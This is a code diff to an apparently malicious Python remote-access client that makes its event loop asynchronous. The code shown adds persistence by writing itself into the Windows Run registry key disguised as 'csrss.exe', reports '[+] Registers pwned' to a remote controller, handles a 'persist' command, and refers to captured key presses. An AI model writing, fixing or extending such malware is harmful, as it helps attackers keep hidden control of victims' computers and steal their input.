@@ -140,7 +140,7 @@ class Client:
                 pass
             stdout = ''
             stderr = ''
-    def addStartup(self):  # this will add the file to the startup registry key
+    async def addStartup(self):  # this will add the file to the startup registry key
         try:
             file_name = os.path.basename(__file__)
             name, ext = os.path.splitext(file_name)
@@ -150,8 +150,10 @@ class Client:
             winreg.SetValueEx(key2change, 'csrss.exe', 0, winreg.REG_SZ,
                     new_file_path)
             self.writer.write(b'[+] Registers pwned')
-            self.writer.drain()
+            await self.writer.drain()
+            await asyncio.sleep(1)
             self.writer.write(bytes(new_file_path + ' in Software\Microsoft\Windows\CurrentVersion\Run','utf-8'))
+            await self.writer.drain()
         except:
             self.writer.write(b'[+] could not write to the registers for persistence')
 
@@ -329,7 +331,7 @@ class Client:
                                     await self.writer.drain()
                                     self.key_pressed = None
                     elif data == 'persist':
-                        self.addStartup()
+                        await self.addStartup()
                     else:
                         self.writer.write(b'\n[-] I do not know the command')
                         await self.writer.drain()
